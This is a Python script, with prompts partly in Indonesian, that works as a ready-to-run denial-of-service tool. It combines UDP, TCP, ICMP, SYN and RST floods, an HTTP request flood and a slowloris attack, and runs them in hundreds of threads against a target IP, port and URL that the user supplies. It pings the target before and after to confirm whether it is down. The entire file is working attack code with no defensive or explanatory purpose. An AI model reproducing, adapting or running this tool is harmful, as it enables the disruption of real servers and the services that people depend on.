import os, time, socket, threading, random, subprocess
import requests
from scapy.all import IP, TCP, ICMP, send

def udp_flood(ip, port, dur):
    data = random._urandom(65507)
    timeout = time.time() + dur
    while time.time() < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(data, (ip, port))
        except: pass

def tcp_flood(ip, port, dur):
    data = random._urandom(1024)
    timeout = time.time() + dur
    while time.time() < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.send(data)
            sock.close()
        except: pass

def icmp_flood(ip, dur):
    timeout = time.time() + dur
    while time.time() < timeout:
        try:
            pkt = IP(dst=ip)/ICMP()
            send(pkt, verbose=0)
        except: pass

def syn_flood(ip, port, dur):
    timeout = time.time() + dur
    while time.time() < timeout:
        pkt = IP(dst=ip)/TCP(dport=port, flags='S')
        send(pkt, verbose=0)

def rst_flood(ip, port, dur):
    timeout = time.time() + dur
    while time.time() < timeout:
        pkt = IP(dst=ip)/TCP(dport=port, flags='R')
        send(pkt, verbose=0)

def http_flood(url, dur):
    timeout = time.time() + dur
    while time.time() < timeout:
        try:
            requests.get(url, headers={'User-Agent': 'Mozilla/5.0'})
        except: pass

def slowloris(ip, port, dur):
    timeout = time.time() + dur
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(b"GET / HTTP/1.1\r\n")
            for _ in range(50):
                s.send(b"X-a: b\r\n")
                time.sleep(0.5)
        except: pass

def check_ping(ip):
    try:
        res = subprocess.run(['ping', '-c', '4', ip], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output = res.stdout.decode()
        loss = "0%"
        avg_ping = "???"
        for line in output.split('\n'):
            if "packet loss" in line:
                loss = line.strip().split(",")[2].strip()
            if "rtt" in line or "avg" in line:
                avg_ping = line.split("/")[4] + " ms"
        print(f"\n[+] Ping: {avg_ping} | Loss: {loss}")
        if "100%" in loss:
            print("[!] IP MERAH: Tidak bisa diakses (Down)")
        else:
            print("[*] IP masih aktif")
    except:
        print("[!] Gagal cek ping")

def full_attack(ip, port, dur, url=None):
    threads = []
    for _ in range(100):
        threads += [
            threading.Thread(target=udp_flood, args=(ip, port, dur)),
            threading.Thread(target=tcp_flood, args=(ip, port, dur)),
            threading.Thread(target=icmp_flood, args=(ip, dur)),
            threading.Thread(target=syn_flood, args=(ip, port, dur)),
            threading.Thread(target=rst_flood, args=(ip, port, dur)),
            threading.Thread(target=slowloris, args=(ip, port, dur))
        ]
        if url:
            threads.append(threading.Thread(target=http_flood, args=(url, dur)))
    for t in threads: t.start()
    for t in threads: t.join()

def main():
    os.system("clear")
    print("=== DDoS FULL POWER + PING STATUS CHECK ===\n")
    ip = input("Target IP Address: ")
    port = int(input("Target Port: "))
    dur = int(input("Durasi Serangan (detik): "))
    url = input("URL Website (jika ada, kosongkan jika tidak): ")
    
    print("\n[*] Cek status awal IP target...")
    check_ping(ip)
    
    print("\n[!] Memulai serangan full power...")
    full_attack(ip, port, dur, url if url else None)

    print("\n[*] Cek status IP setelah serangan...")
    check_ping(ip)

if __name__ == "__main__":
    try:
        from scapy.all import send
    except ImportError:
        os.system("pip install scapy requests")
    main()